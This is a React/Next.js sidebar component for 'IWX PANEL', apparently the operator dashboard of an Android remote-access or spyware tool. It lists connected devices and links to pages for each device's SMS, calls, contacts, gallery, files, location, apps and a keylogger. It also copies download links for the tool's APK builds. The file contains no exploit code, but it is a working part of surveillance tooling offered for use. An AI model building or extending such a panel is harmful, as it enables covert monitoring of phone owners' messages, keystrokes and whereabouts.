'use client'
import Link from 'next/link'
import { usePathname } from 'next/navigation'
import {
  LayoutDashboard, FolderOpen,
  Settings, Smartphone, Wifi, WifiOff, ChevronDown,
  MessageSquare, Phone, Users, MapPin, Package, Image, KeySquare,
  MoreHorizontal, X, Trash2, CheckSquare, Square,
  Bell, BellRing, ExternalLink, Server,
} from 'lucide-react'
import { useState, useEffect, useRef } from 'react'
import { useBadge } from '@/contexts/BadgeContext'

interface DeviceItem {
  deviceId: string
  deviceName: string
  connected: boolean
  model?: string
}

interface SidebarProps {
  connected: boolean
  devices?: DeviceItem[]
  selectedId?: string | null
  onSelect?: (id: string) => void
}

const navItems = [
  { href: '/', label: 'Dashboard', icon: LayoutDashboard },
  { href: '/files', label: 'Files', icon: FolderOpen },
  { href: '/gallery', label: 'Gallery', icon: Image },
  { href: '/sms', label: 'SMS', icon: MessageSquare },
  { href: '/calls', label: 'Calls', icon: Phone },
  { href: '/contacts', label: 'Contacts', icon: Users },
  { href: '/location', label: 'Location', icon: MapPin },
  { href: '/apps', label: 'Apps', icon: Package },
  { href: '/keylog', label: 'Keylogger', icon: KeySquare },
  { href: '/setup', label: 'Setup', icon: Settings },
  { href: '/server-config', label: 'Server Config', icon: Server },
]

const mobileNavPinned = [
  { href: '/', label: 'Dashboard', icon: LayoutDashboard },
  { href: '/gallery', label: 'Gallery', icon: Image },
  { href: '/sms', label: 'SMS', icon: MessageSquare },
]

export default function Sidebar({ connected, devices = [], selectedId, onSelect }: SidebarProps) {
  const pathname = usePathname()
  const { smsBadge, callsBadge } = useBadge()
  const badgeMap: Record<string, number> = { '/sms': smsBadge, '/calls': callsBadge }
  const [showPicker, setShowPicker]   = useState(false)
  const [showDrawer, setShowDrawer]   = useState(false)
  const [toDelete, setToDelete]       = useState<Set<string>>(new Set())
  const [deleting, setDeleting]       = useState(false)

  // ── Build Notification ──────────────────────────────────────────────────────
  type BuildInfo = { commitSha: string; fullSha: string; createdAt: string; updatedAt?: string; url: string; status: string; conclusion: string | null }
  const [buildLatest,   setBuildLatest]   = useState<BuildInfo | null>(null)
  const [buildSuccess,  setBuildSuccess]  = useState<BuildInfo | null>(null)
  const [buildHasNew,   setBuildHasNew]   = useState(false)
  const [showBuildDrop, setShowBuildDrop] = useState(false)
  const [buildLoading,  setBuildLoading]  = useState(false)
  const buildDropRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    const lastSeenSha = localStorage.getItem('iwx_last_build_sha') ?? ''
    const check = async () => {
      try {
        const res = await fetch('/api/github/builds')
        if (!res.ok) return
        const d = await res.json()
        if (d.latest)      setBuildLatest(d.latest)
        if (d.lastSuccess) {
          setBuildSuccess(d.lastSuccess)
          setBuildHasNew(d.lastSuccess.fullSha !== lastSeenSha)
        }
      } catch {}
    }
    check()
    const t = setInterval(check, 30000)
    return () => clearInterval(t)
  }, [])

  // Tutup dropdown kalau klik luar
  useEffect(() => {
    const handler = (e: MouseEvent) => {
      if (buildDropRef.current && !buildDropRef.current.contains(e.target as Node)) {
        setShowBuildDrop(false)
      }
    }
    document.addEventListener('mousedown', handler)
    return () => document.removeEventListener('mousedown', handler)
  }, [])

  const markBuildSeen = () => {
    if (buildSuccess?.fullSha) {
      localStorage.setItem('iwx_last_build_sha', buildSuccess.fullSha)
      setBuildHasNew(false)
    }
    setShowBuildDrop(v => !v)
  }

  const copyApkUrl = async (mode: 'release' | 'debug') => {
    setBuildLoading(true)
    try {
      const res  = await fetch(`/api/github/apk?mode=${mode}&action=info`)
      const info = await res.json()
      if (!res.ok) { alert(info.error); return }
      const url = `${window.location.origin}/api/github/apk?mode=${mode}`
      await navigator.clipboard.writeText(url)
      alert(`✅ URL ${mode.toUpperCase()} APK disalin!\n\nKommit: ${info.commitSha} · ${info.sizeMb} MB`)
    } catch { alert('Gagal copy URL') } finally { setBuildLoading(false) }
  }

  const statusLabel = (s: string, c: string | null) => {
    if (s === 'in_progress') return { label: 'Building...', color: 'text-android-yellow', dot: 'bg-android-yellow animate-pulse' }
    if (c === 'success')     return { label: 'Success ✅',  color: 'text-android-green',  dot: 'bg-android-green' }
    if (c === 'failure')     return { label: 'Failed ❌',   color: 'text-android-red',    dot: 'bg-android-red' }
    return                          { label: s,             color: 'text-android-muted',  dot: 'bg-android-muted' }
  }

  const selected = devices.find(d => d.deviceId === selectedId)

  const toggleDelete = (id: string) => {
    setToDelete(prev => {
      const next = new Set(prev)
      next.has(id) ? next.delete(id) : next.add(id)
      return next
    })
  }

  const deleteSelected = async () => {
    if (toDelete.size === 0) return
    const names = devices.filter(d => toDelete.has(d.deviceId)).map(d => d.deviceName).join(', ')
    if (!confirm(`Hapus device: ${names}?`)) return
    setDeleting(true)
    await Promise.all([...toDelete].map(id =>
      fetch(`/api/devices?deviceId=${encodeURIComponent(id)}`, { method: 'DELETE' })
    ))
    setDeleting(false)
    setToDelete(new Set())
    setShowPicker(false)
    window.location.reload()
  }

  const deleteSingle = async (d: DeviceItem) => {
    if (!confirm(`Hapus device "${d.deviceName}"?`)) return
    await fetch(`/api/devices?deviceId=${encodeURIComponent(d.deviceId)}`, { method: 'DELETE' })
    window.location.reload()
  }

  return (
    <>
      {/* ─── DESKTOP SIDEBAR ─── */}
      <aside className="hidden md:flex w-56 min-h-screen bg-android-surface border-r border-android-border flex-col shrink-0">
        <div className="px-4 py-4 border-b border-android-border">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-xl bg-android-green flex items-center justify-center shrink-0">
              <Smartphone size={16} className="text-android-bg" />
            </div>
            <div className="min-w-0">
              <h1 className="text-sm font-bold text-white leading-tight">IWX PANEL</h1>
              <p className="text-xs text-android-muted leading-tight">Remote Device Access</p>
            </div>
          </div>
        </div>

        {/* Desktop device picker */}
        <div className="px-3 py-3 border-b border-android-border">
          <div className="relative">
            <button
              onClick={() => setShowPicker(v => !v)}
              className={`w-full flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium border transition-colors ${
                connected
                  ? 'bg-android-green/10 text-android-green border-android-green/20'
                  : 'bg-android-red/10 text-android-red border-android-red/20'
              }`}
            >
              {connected ? <Wifi size={13} /> : <WifiOff size={13} />}
              <span className="flex-1 truncate text-left">
                {selected?.deviceName ?? (devices.length > 0 ? 'Pilih device' : 'No Device')}
              </span>
              {devices.length > 0 && (
                <ChevronDown size={12} className={`shrink-0 transition-transform ${showPicker ? 'rotate-180' : ''}`} />
              )}
            </button>

            {showPicker && devices.length > 0 && (
              <div className="absolute top-full left-0 right-0 mt-1 bg-android-bg border border-android-border rounded-lg z-50 overflow-hidden shadow-lg">
                {devices.map(d => (
                  <div key={d.deviceId} className="flex items-center gap-1 px-2 py-1.5 hover:bg-white/5 transition-colors">
                    <button
                      onClick={() => toggleDelete(d.deviceId)}
                      className="text-android-muted hover:text-android-text shrink-0"
                    >
                      {toDelete.has(d.deviceId)
                        ? <CheckSquare size={13} className="text-android-green" />
                        : <Square size={13} />}
                    </button>
                    <button
                      onClick={() => { onSelect?.(d.deviceId); setShowPicker(false); setToDelete(new Set()) }}
                      className={`flex-1 flex items-center gap-2 text-xs text-left ${d.deviceId === selectedId ? 'text-android-green' : 'text-android-muted'}`}
                    >
                      <div className={`w-2 h-2 rounded-full shrink-0 ${d.connected ? 'bg-android-green' : 'bg-android-muted'}`} />
                      <span className="truncate">{d.deviceName}</span>
                    </button>
                    <button
                      onClick={() => deleteSingle(d)}
                      className="p-1 rounded hover:bg-android-red/20 text-android-muted hover:text-android-red transition-colors shrink-0"
                    >
                      <Trash2 size={11} />
                    </button>
                  </div>
                ))}
                {toDelete.size > 0 && (
                  <button
                    onClick={deleteSelected}
                    disabled={deleting}
                    className="w-full py-2 text-xs font-semibold text-android-red bg-android-red/10 hover:bg-android-red/20 border-t border-android-border transition-colors disabled:opacity-50"
                  >
                    {deleting ? 'Menghapus…' : `🗑 Hapus ${toDelete.size} device`}
                  </button>
                )}
              </div>
            )}
          </div>
        </div>

        <nav className="flex-1 px-2 py-3 space-y-0.5 overflow-y-auto">
          {navItems.map(({ href, label, icon: Icon }) => {
            const active = pathname === href
            const badge = badgeMap[href] ?? 0
            return (
              <Link key={href} href={href} className={`flex items-center gap-2.5 px-3 py-2 rounded-lg text-xs font-medium transition-all duration-150 active:scale-95 active:opacity-70 select-none ${
                active
                  ? 'bg-android-green/10 text-android-green border border-android-green/20'
                  : 'text-android-muted hover:text-android-text hover:bg-white/5'
              }`}>
                <Icon size={15} />
                <span className="flex-1">{label}</span>
                {badge > 0 && (
                  <span className="ml-auto min-w-[18px] h-[18px] px-1 bg-android-red text-white text-[10px] font-bold rounded-full flex items-center justify-center leading-none animate-pulse">
                    {badge > 99 ? '99+' : badge}
                  </span>
                )}
              </Link>
            )
          })}
        </nav>

        {/* Build Notification Bell — Desktop */}
        <div className="px-3 py-3 border-t border-android-border relative" ref={buildDropRef}>
          <div className="flex items-center justify-between">
            <div>
              <p className="text-xs text-android-muted">IWX PANEL v0.5.0</p>
              <p className="text-[10px] text-android-muted/50">by Kztutorial99</p>
            </div>
            <button
              onClick={markBuildSeen}
              title="Status GitHub Build"
              className="relative p-2 rounded-lg hover:bg-white/5 transition-colors"
            >
              {buildHasNew
                ? <BellRing size={15} className="text-android-green" />
                : <Bell size={15} className="text-android-muted" />}
              {buildHasNew && (
                <span className="absolute top-1 right-1 w-2 h-2 rounded-full bg-android-green animate-pulse" />
              )}
            </button>
          </div>

          {/* Build Dropdown */}
          {showBuildDrop && (
            <div className="absolute bottom-full left-2 right-2 mb-2 bg-android-bg border border-android-border rounded-xl shadow-2xl z-50 overflow-hidden">
              <div className="px-3 py-2.5 border-b border-android-border flex items-center justify-between">
                <span className="text-[10px] font-bold text-android-muted uppercase tracking-wider">GitHub Actions</span>
                {buildLatest && (() => {
                  const st = statusLabel(buildLatest.status, buildLatest.conclusion)
                  return (
                    <span className={`text-[10px] font-mono font-bold flex items-center gap-1.5 ${st.color}`}>
                      <span className={`w-1.5 h-1.5 rounded-full ${st.dot}`} />
                      {st.label}
                    </span>
                  )
                })()}
              </div>

              {buildLatest && (
                <div className="px-3 py-2 border-b border-android-border/50 text-[10px] space-y-1">
                  <div className="flex justify-between">
                    <span className="text-android-muted">Latest commit</span>
                    <span className="font-mono text-android-text">{buildLatest.commitSha}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-android-muted">Updated</span>
                    <span className="font-mono text-android-text">{new Date(buildLatest.updatedAt ?? buildLatest.createdAt).toLocaleTimeString('id-ID', {hour:'2-digit',minute:'2-digit'})}</span>
                  </div>
                  {buildLatest.url && (
                    <a href={buildLatest.url} target="_blank" rel="noreferrer"
                      className="flex items-center gap-1 text-android-blue hover:underline mt-1">
                      <ExternalLink size={9} /> Lihat di GitHub
                    </a>
                  )}
                </div>
              )}

              {buildSuccess && (
                <div className="px-3 py-2.5 space-y-1.5">
                  <p className="text-[10px] font-semibold text-android-green mb-2">APK Siap — commit {buildSuccess.commitSha}</p>
                  {(['release','debug'] as const).map(m => (
                    <button key={m} onClick={() => copyApkUrl(m)} disabled={buildLoading}
                      className={`w-full flex items-center gap-2 px-2.5 py-2 rounded-lg text-[11px] font-mono font-bold border transition-colors disabled:opacity-50 ${
                        m === 'release'
                          ? 'bg-android-green/10 border-android-green/30 text-android-green hover:bg-android-green/20'
                          : 'bg-android-blue/10 border-android-blue/30 text-android-blue hover:bg-android-blue/20'
                      }`}>
                      {m === 'release' ? '🚀' : '🛠️'} Copy URL {m.toUpperCase()} APK
                    </button>
                  ))}
                </div>
              )}
            </div>
          )}
        </div>
      </aside>

      {/* ─── MOBILE HEADER ─── */}
      <header className="md:hidden fixed top-0 left-0 right-0 z-40 bg-android-surface border-b border-android-border px-4 h-14 flex items-center justify-between">
        <div className="flex items-center gap-2.5">
          <div className="w-7 h-7 rounded-lg bg-android-green flex items-center justify-center">
            <Smartphone size={14} className="text-android-bg" />
          </div>
          <span className="text-sm font-bold text-white">IWX PANEL</span>
          {/* Build bell — mobile */}
          <button onClick={markBuildSeen} className="relative ml-1 p-1 rounded-lg">
            {buildHasNew
              ? <BellRing size={14} className="text-android-green" />
              : <Bell size={14} className="text-android-muted" />}
            {buildHasNew && <span className="absolute top-0 right-0 w-1.5 h-1.5 rounded-full bg-android-green animate-pulse" />}
          </button>
        </div>

        {/* Device Manager — top right */}
        <div className="relative">
          <button
            onClick={() => { setShowPicker(v => !v); setToDelete(new Set()) }}
            className={`flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border transition-colors ${
              connected
                ? 'text-android-green border-android-green/30 bg-android-green/10'
                : 'text-android-muted border-android-border'
            }`}
          >
            <div className={`w-1.5 h-1.5 rounded-full ${connected ? 'bg-android-green status-dot-online' : 'bg-android-red'}`} />
            <span className="max-w-[80px] truncate">
              {selected?.deviceName ?? (devices.length > 0 ? 'Device' : 'Offline')}
            </span>
            <ChevronDown size={10} className={`transition-transform ${showPicker ? 'rotate-180' : ''}`} />
          </button>

          {showPicker && (
            <>
              <div className="fixed inset-0 z-40" onClick={() => { setShowPicker(false); setToDelete(new Set()) }} />
              <div className="absolute top-full right-0 mt-2 w-60 bg-android-surface border border-android-border rounded-xl z-50 overflow-hidden shadow-2xl">
                <div className="flex items-center justify-between px-3 py-2.5 border-b border-android-border">
                  <span className="text-xs font-semibold text-android-text">Pilih / Kelola Device</span>
                  {toDelete.size > 0 && (
                    <span className="text-[10px] text-android-green">{toDelete.size} dipilih</span>
                  )}
                </div>

                {devices.length === 0 ? (
                  <div className="px-4 py-4 text-xs text-android-muted text-center">Belum ada device</div>
                ) : (
                  devices.map(d => (
                    <div key={d.deviceId} className={`flex items-center gap-2 px-3 py-2.5 border-b border-android-border/50 last:border-0 transition-colors ${
                      d.deviceId === selectedId ? 'bg-android-green/5' : 'hover:bg-white/3'
                    }`}>
                      <button
                        onClick={() => toggleDelete(d.deviceId)}
                        className="shrink-0 text-android-muted hover:text-android-text"
                      >
                        {toDelete.has(d.deviceId)
                          ? <CheckSquare size={14} className="text-android-red" />
                          : <Square size={14} />}
                      </button>

                      <button
                        className="flex-1 flex items-center gap-2 text-xs text-left min-w-0"
                        onClick={() => { onSelect?.(d.deviceId); setShowPicker(false); setToDelete(new Set()) }}
                      >
                        <div className={`w-2 h-2 rounded-full shrink-0 ${d.connected ? 'bg-android-green status-dot-online' : 'bg-android-red'}`} />
                        <div className="min-w-0">
                          <p className={`font-medium truncate ${d.deviceId === selectedId ? 'text-android-green' : 'text-android-text'}`}>
                            {d.deviceName}
                          </p>
                          <p className="text-[10px] text-android-muted">
                            {d.connected ? 'Online' : 'Offline'}
                            {d.model ? ` · ${d.model}` : ''}
                          </p>
                        </div>
                      </button>

                      <button
                        onClick={() => { setShowPicker(false); deleteSingle(d) }}
                        className="shrink-0 p-1.5 rounded-lg hover:bg-android-red/20 text-android-muted hover:text-android-red transition-colors"
                      >
                        <Trash2 size={13} />
                      </button>
                    </div>
                  ))
                )}

                {toDelete.size > 0 && (
                  <button
                    onClick={deleteSelected}
                    disabled={deleting}
                    className="w-full py-2.5 text-xs font-semibold text-android-red bg-android-red/10 hover:bg-android-red/20 border-t border-android-border transition-colors disabled:opacity-50"
                  >
                    {deleting ? 'Menghapus…' : `🗑 Hapus ${toDelete.size} device yang dipilih`}
                  </button>
                )}
              </div>
            </>
          )}
        </div>
      </header>

      {/* ─── MOBILE BOTTOM NAV ─── */}
      <nav className="md:hidden fixed bottom-0 left-0 right-0 z-40 bg-android-surface border-t border-android-border flex">
        {mobileNavPinned.map(({ href, label, icon: Icon }) => {
          const active = pathname === href
          return (
            <Link
              key={href}
              href={href}
              className={`flex-1 flex flex-col items-center justify-center py-2 gap-0.5 transition-all duration-150 active:scale-90 active:opacity-60 select-none ${active ? 'text-android-green' : 'text-android-muted'}`}
            >
              <Icon size={18} />
              <span className="text-[9px] font-medium leading-none">{label}</span>
            </Link>
          )
        })}

        <button
          onClick={() => setShowDrawer(true)}
          className={`flex-1 flex flex-col items-center justify-center py-2 gap-0.5 transition-all duration-150 active:scale-90 active:opacity-60 select-none ${showDrawer ? 'text-android-green' : 'text-android-muted'}`}
        >
          <MoreHorizontal size={18} />
          <span className="text-[9px] font-medium leading-none">More</span>
        </button>
      </nav>

      {/* ─── MOBILE DRAWER ─── */}
      {showDrawer && (
        <>
          <div
            className="md:hidden fixed inset-0 z-50 bg-black/60"
            onClick={() => setShowDrawer(false)}
          />
          <div className="md:hidden fixed bottom-0 left-0 right-0 z-50 bg-android-surface rounded-t-2xl border-t border-android-border pb-safe">
            <div className="flex items-center justify-between px-4 pt-4 pb-3 border-b border-android-border">
              <div className="flex items-center gap-2">
                <div className="w-6 h-6 rounded-lg bg-android-green flex items-center justify-center">
                  <Smartphone size={12} className="text-android-bg" />
                </div>
                <span className="text-sm font-bold text-white">Menu</span>
              </div>
              <button
                onClick={() => setShowDrawer(false)}
                className="p-1.5 rounded-lg text-android-muted hover:text-white hover:bg-white/5 transition-colors"
              >
                <X size={16} />
              </button>
            </div>

            <div className="grid grid-cols-3 gap-2 p-4">
              {navItems.map(({ href, label, icon: Icon }) => {
                const active = pathname === href
                const badge = badgeMap[href] ?? 0
                return (
                  <Link
                    key={href}
                    href={href}
                    onClick={() => setShowDrawer(false)}
                    className={`relative flex flex-col items-center justify-center gap-1.5 py-3 px-2 rounded-xl border transition-all duration-150 active:scale-90 active:opacity-60 select-none ${
                      active
                        ? 'bg-android-green/10 border-android-green/30 text-android-green'
                        : 'bg-white/3 border-android-border text-android-muted hover:text-white hover:bg-white/5'
                    }`}
                  >
                    <div className="relative">
                      <Icon size={20} />
                      {badge > 0 && (
                        <span className="absolute -top-1.5 -right-2 min-w-[16px] h-[16px] px-0.5 bg-android-red text-white text-[9px] font-bold rounded-full flex items-center justify-center leading-none animate-pulse">
                          {badge > 99 ? '99+' : badge}
                        </span>
                      )}
                    </div>
                    <span className="text-[10px] font-medium leading-none text-center">{label}</span>
                  </Link>
                )
              })}
            </div>

            <div className="px-4 pb-4" />
          </div>
        </>
      )}
    </>
  )
}
